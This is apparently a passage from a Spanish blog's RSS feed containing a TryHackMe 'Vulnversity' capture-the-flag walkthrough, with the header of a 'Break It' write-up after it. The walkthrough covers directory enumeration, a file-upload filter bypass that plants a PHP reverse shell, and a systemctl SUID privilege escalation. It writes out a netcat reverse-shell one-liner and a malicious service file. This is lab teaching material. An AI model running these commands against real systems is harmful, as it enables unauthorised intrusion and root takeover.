&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~# gobuster dir -u http://10.10.193.246:3333 -w /usr/share/wordlists/dirb/common.txt 
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
Gobuster v3.0.1
by OJ Reeves &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; Christian Mehlmauer &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@_FireFart_&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Url:            http://10.10.193.246:3333
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Threads:        &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Wordlist:       /usr/share/wordlists/dirb/common.txt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Status codes:   200,204,301,302,307,401,403
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User Agent:     gobuster/3.0.1
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Timeout:        &lt;span class=&#34;nv&#34;&gt;10s&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
2019/12/25 15:56:20 Starting &lt;span class=&#34;nv&#34;&gt;gobuster&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/fonts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/internal &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
2019/12/25 15:58:19 &lt;span class=&#34;nv&#34;&gt;Finished&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Realizamos un escaneo al directorio &lt;code&gt;/internal/&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/www# gobuster dir -u http://10.10.193.246:3333/internal/ -w /usr/share/wordlists/dirb/common.txt
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
Gobuster v3.0.1
by OJ Reeves &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; Christian Mehlmauer &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@_FireFart_&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Url:            http://10.10.193.246:3333/internal/
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Threads:        &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Wordlist:       /usr/share/wordlists/dirb/common.txt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Status codes:   200,204,301,302,307,401,403
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User Agent:     gobuster/3.0.1
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Timeout:        &lt;span class=&#34;nv&#34;&gt;10s&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
2019/12/25 16:15:40 Starting &lt;span class=&#34;nv&#34;&gt;gobuster&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
/.hta &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/.htaccess &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/.htpasswd &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/uploads &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
2019/12/25 16:17:19 &lt;span class=&#34;nv&#34;&gt;Finished&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;-compromise-the-webserver-&#34;&gt;{ Compromise the webserver }&lt;/h2&gt;
&lt;p&gt;El directorio &lt;code&gt;/internal&lt;/code&gt; nos muestra una pagina donde podemos subir archivos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnversity/Screenshot_2019-12-25_15-59-08.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al intentar subir un archivo con extension &lt;code&gt;.php, .txt, .jpg&lt;/code&gt; nos muestra un mensaje de error.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnversity/Screenshot_2019-12-25_16-00-16.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;burpsuite&#34;&gt;BURPSUITE&lt;/h3&gt;
&lt;p&gt;Utilizamos burpsuite para poder capturar la solicitud que hacemos al enviar el archivo, cambiando la extension y enviarla nuevamente con diferentes extenciones las cuales puedan ser interpretadas por php.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.owasp.org/index.php/Unrestricted_File_Upload&#34;&gt;&lt;strong&gt;OWASP - Unrestricted File Upload&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos una shell inversa que nos trae Kali Linux (&lt;code&gt;/usr/share/webshells/php/php-reverse-shell.php&lt;/code&gt;) cambiamos la ip y el hacia donde va la shell. Intentamos subir este archivo y capturamos la solicitud con burpsuite.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnversity/Screenshot_2019-12-25_16-09-02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Enviamos la solicitud a Intruder, agregamos un marcador de payload a la extension del archivo para poder hacer la misma solicitud pero con diferente extension.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnversity/Screenshot_2019-12-25_16-09-46.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En la pestaña de payloads agregamos las extensiones que vamos a utilizar.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnversity/Screenshot_2019-12-25_16-12-04.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;.php4
.php5
.pht
.phtml
.ini
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Comenzamos el &amp;lsquo;Ataque&amp;rsquo;, al finalizar vemos que una de las solicitudes fue exitosa con la extension &lt;code&gt;.phtml&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnversity/Screenshot_2019-12-25_16-15-57.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Revisamos la pagina de &lt;code&gt;/internal/uploads/&lt;/code&gt; y vemos que nuestro archivo esta ahora en el servidor.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnversity/Screenshot_2019-12-25_16-18-09.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Visitamos nuestro archivo para que se ejecute y obtenemos una shell.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnversity/Screenshot_2019-12-25_16-19-26.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;-privilege-escalation-&#34;&gt;{ Privilege Escalation }&lt;/h2&gt;
&lt;p&gt;Ahora que tenemos una shell en la maquina podemos buscar una manera para poder obtener permisos root, comenzamos enumerando los archivos SUID con find.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnversity/Screenshot_2019-12-25_16-22-06.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ find / -perm -4000 2&amp;gt; /dev/null &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; xargs ls -lah
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        31K Jul &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; /bin/fusermount
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        40K May &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt; /bin/mount
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root       139K Jan &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt; /bin/ntfs-3g
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        44K May  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2014&lt;/span&gt; /bin/ping
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        44K May  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2014&lt;/span&gt; /bin/ping6
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        40K May &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt; /bin/su
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root       645K Feb &lt;span class=&#34;m&#34;&gt;13&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /bin/systemctl
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        27K May &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt; /bin/umount
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        35K Mar  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt; /sbin/mount.cifs
-rwsr-sr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; daemon daemon      51K Jan &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; /usr/bin/at
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        49K May &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt; /usr/bin/chfn
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        40K May &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt; /usr/bin/chsh
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        74K May &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt; /usr/bin/gpasswd
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        33K May &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt; /usr/bin/newgidmap
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        39K May &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt; /usr/bin/newgrp
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        33K May &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt; /usr/bin/newuidmap
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        53K May &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt; /usr/bin/passwd
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        23K Jan &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /usr/bin/pkexec
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root       134K Jul  &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt; /usr/bin/sudo
-rwsr-xr-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   messagebus  42K Jan &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt; /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        10K Mar &lt;span class=&#34;m&#34;&gt;27&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt; /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root       419K Jan &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /usr/lib/openssh/ssh-keysign
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        15K Jan &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        97K Jan &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /usr/lib/snapd/snap-confine
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        75K Jul &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; 11:22 /usr/lib/squid/pinger
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        39K Jun &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt; /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Podemos observar que entre los binarios se encuentra systemctl, por lo cual vamos a utilizarlo para obtener privilegios root, con los siguientes comandos.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://gtfobins.github.io/gtfobins/systemctl/&#34;&gt;&lt;strong&gt;GTFOBINS - Systemctl&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Primero creamos un archivo el cual va ejecutar una shell inversa:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.8.1.72 1337 &amp;gt;/tmp/f&amp;#34;&lt;/span&gt; &amp;gt; /tmp/shell.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Creamos un servicio y lo ejecutamos con systemctl.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;TF&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;mktemp&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;.service

&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;[Service]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Type=oneshot
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;ExecStart=/bin/sh -c &amp;#34;bash /tmp/shell.sh&amp;#34;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[Install]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;WantedBy=multi-user.target&amp;#39;&lt;/span&gt; &amp;gt; &lt;span class=&#34;nv&#34;&gt;$TF&lt;/span&gt;

/bin/systemctl link &lt;span class=&#34;nv&#34;&gt;$TF&lt;/span&gt;
/bin/systemctl &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt; --now &lt;span class=&#34;nv&#34;&gt;$TF&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnversity/Screenshot_2019-12-25_16-36-04.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una shell con el usuario root.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnversity/Screenshot_2019-12-25_16-36-25.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/vulnversity/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/vulnversity/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Break It</title>
        <link>https://sckull.github.io/posts/breakit/</link>
        <pubDate>Thu, 12 Dec 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Thu, 12 Dec 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/breakit/</guid>
        <description>Break It es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;Break It es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakit/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Break It&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Room&lt;/td&gt;
&lt;td&gt;Break It&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Can you break the code?&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;2539&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/DesKel&#34;&gt;Deskel&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
